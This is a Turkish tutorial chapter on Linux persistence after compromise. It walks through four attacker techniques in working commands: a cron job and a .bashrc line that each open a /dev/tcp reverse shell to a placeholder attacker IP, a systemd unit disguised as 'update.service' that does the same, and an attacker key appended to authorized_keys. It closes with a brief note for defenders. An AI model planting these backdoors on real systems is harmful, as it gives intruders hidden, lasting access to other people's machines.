# 6.3. Kalıcılık Mekanizmaları

[↩️ Geri: İçindekiler](../README.md)

Bir saldırgan, bir sisteme reverse shell gibi bir yöntemle erişim sağladıktan sonraki en önemli hedefi, bu erişimi **kalıcı (persistent)** hale getirmektir. Çünkü mevcut shell bağlantısı koptuğunda veya sistem yeniden başlatıldığında, tüm erişimini kaybedecektir. Kalıcılık, saldırganın istediği zaman sisteme geri dönebilmesini sağlayan teknikler bütünüdür.

Linux sistemlerinde kalıcılık sağlamak için kullanılan birçok yöntem vardır. İşte en yaygın olanlardan bazıları:

## 1. `cron` ile Zamanlanmış Görevler

Bu, en basit ve en yaygın kalıcılık yöntemidir. Saldırgan, belirli aralıklarla (örneğin, her 5 dakikada bir) kendi dinleyicisine bir reverse shell bağlantısı başlatan bir komutu kullanıcının `crontab`'ına ekler.

**Saldırganın Adımları:**
1.  Mevcut `crontab`'ı bir dosyaya yedekle:
    ```bash
    crontab -l > /tmp/cron_backup
    ```
2.  Yedek dosyasına zararlı reverse shell komutunu ekle:
    ```bash
    echo "*/5 * * * * bash -i >& /dev/tcp/<saldırgan_IP>/4444 0>&1" >> /tmp/cron_backup
    ```
3.  Değiştirilmiş dosyayı yeni `crontab` olarak yükle:
    ```bash
    crontab /tmp/cron_backup
    ```
4.  İzleri temizle:
    ```bash
    rm /tmp/cron_backup
    ```
Artık hedef sistem, her 5 dakikada bir saldırganın makinesine bağlanmaya çalışacaktır. Saldırganın tek yapması gereken, istediği zaman kendi makinesinde bir dinleyici (`nc -lvnp 4444`) başlatmaktır.

## 2. Shell Başlangıç Dosyalarına Ekleme (`.bashrc`, `.profile`)

Bir kullanıcı oturum açtığında veya yeni bir terminal başlattığında otomatik olarak çalışan script'ler (`~/.bashrc`, `~/.profile`, `~/.bash_login` vb.), kalıcılık için mükemmel hedeflerdir.

Saldırgan, bu dosyalardan birinin sonuna reverse shell komutunu ekler. Böylece, masum bir kullanıcı `ssh` ile sunucuya bağlandığı anda, arka planda saldırgana bir shell oturumu açılır.

```bash
# .bashrc dosyasının sonuna reverse shell komutunu ekle
echo "bash -i >& /dev/tcp/<saldırgan_IP>/5555 0>&1 &" >> ~/.bashrc
```
Sondaki `&` işareti, komutun arka planda çalışmasını sağlar, böylece meşru kullanıcının terminali kilitlenmez ve şüphe çekmez.

## 3. `systemd` Servisleri Oluşturma

Daha gelişmiş ve gizli bir yöntem, zararlı script'i meşru bir sistem servisi gibi göstermektir. `systemd`, modern Linux sistemlerinin servis yöneticisidir ve saldırganlar, sistem başladığında otomatik olarak çalışan kendi servis dosyalarını oluşturabilirler.

**Saldırganın Adımları:**
1.  `/etc/systemd/system/` dizininde (veya kullanıcı için `~/.config/systemd/user/`) bir servis dosyası oluştur (`update.service` gibi masum bir isimle):
    ```ini
    # /etc/systemd/system/update.service
    [Unit]
    Description=System Update Service

    [Service]
    Type=simple
    ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<saldırgan_IP>/6666 0>&1"
    Restart=always
    RestartSec=10

    [Install]
    WantedBy=multi-user.target
    ```
    `Restart=always` ayarı, bağlantı kopsa bile servisin sürekli olarak yeniden başlamasını ve bağlanmaya çalışmasını sağlar.

2.  Yeni servisi etkinleştir ve başlat:
    ```bash
    sudo systemctl daemon-reload
    sudo systemctl enable update.service
    sudo systemctl start update.service
    ```
Bu yöntem, `root` yetkileri gerektirir ancak en güvenilir kalıcılık yöntemlerinden biridir.

## 4. SSH Yetkili Anahtarlarını (Authorized Keys) Ekleme

Eğer saldırgan bir kullanıcının ev dizininde yazma iznine sahipse, en kolay kalıcılık yöntemlerinden biri, kendi **açık SSH anahtarını** o kullanıcının `~/.ssh/authorized_keys` dosyasına eklemektir.
```bash
# Saldırganın kendi public key'ini bir değişkene atayalım
attacker_key="ssh-ed25519 AAAA... attacker@kali"

# Hedef kullanıcının authorized_keys dosyasına ekleyelim
echo $attacker_key >> /home/victim/.ssh/authorized_keys
```
Artık saldırgan, kendi özel anahtarını kullanarak `ssh victim@<hedef_IP>` komutu ile parola olmadan doğrudan sisteme bağlanabilir. Bu, son derece gizli ve tespiti zor bir yöntemdir.

Mavi Takım için bu kalıcılık noktalarını (`cron` görevleri, shell başlangıç dosyaları, `systemd` servisleri, `authorized_keys` dosyaları) düzenli olarak kontrol etmek, bir sızmanın kalıcı hale gelmesini önlemek için hayati önem taşır.

---
[➡️ Sonraki Konu: İz Temizleme](./04-Iz-Temizleme.md)
